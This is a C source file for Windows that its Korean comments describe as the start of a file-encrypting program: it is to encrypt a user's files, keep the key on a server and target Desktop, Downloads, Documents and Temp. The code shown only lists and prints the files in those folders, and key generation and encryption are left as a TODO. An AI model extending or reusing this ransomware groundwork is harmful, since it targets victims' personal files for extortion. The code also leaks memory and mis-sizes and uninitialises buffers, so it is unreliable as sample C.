#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <locale.h>
#include "files.h"

// 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.
// 서버용 , 클라이언트
// 타깃을 구조체로 묶어 재분류 하라는 것이
// Desktop, Downloads, Documents ...Temp를 한 구조체 안에서 다루도록
// TODO : 키생성, 암호화


int main() {

    _wsetlocale(LC_ALL, L"Korean" );
    wchar_t* dirPrefix; 
    dirPrefix = (wchar_t*)malloc(sizeof(wchar_t*) * 100); 
    wcscpy(dirPrefix, L"C:\\Users\\");
    wchar_t *userName = getUserName();
    wcscat(dirPrefix, userName);

    wchar_t* dir = (wchar_t*)malloc(sizeof(wchar_t*)*100);
    memset(dir, 0, sizeof(wchar_t*) * 100);
    wcscat(dir, dirPrefix);

    //[1] Desktop
    wchar_t desktop[100][100] = { {0,} };
    wcscat(dir, DESKTOP_DIR);
    getDirectoryFileList(dir, desktop);
    for(int i = 0; i < 100; i++) {
        if(desktop[i][0] == '\0') break;
        printf("%S\n", desktop[i]);
    }

    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscat(dir, dirPrefix);
    
    // [2]  Downloads
    wchar_t downloads[100][100];
    wcscat(dir, DOWNLOADS_DIR);
    getDirectoryFileList(dir, downloads);
    printf("%S\n", downloads[0]);
    printf("%c\n", downloads[0][0]);
    printf("%c\n", downloads[0][1]);

    for(int i = 0; i < 100; i++) {
        if(downloads[i][0] == '\0') break;
        printf("%S\n", downloads[i]);
    }

    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscat(dir, dirPrefix);

    // [3]  Documents
    wchar_t documents[100][100];
    wcscat(dir, DOCUMENTS_DIR);
    getDirectoryFileList(dir, documents);
    for(int i = 0; i < 100; i++) {
        if(documents[i][0] == '\0') break;
        printf("%S\n", documents[i]);
    }

    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
    wcscat(dir, dirPrefix);

    // [4]  AppData/Local/Temp
    wchar_t appData[100][100];
    wcscat(dir, APPDATA_DIR);
    getDirectoryFileList(dir, appData);
    for(int i = 0; i < 100; i++) {
        if(appData[i][0] == '\0') break;
        printf("%S\n", appData[i]);
    }

    free(dirPrefix);
    free(dir);
}


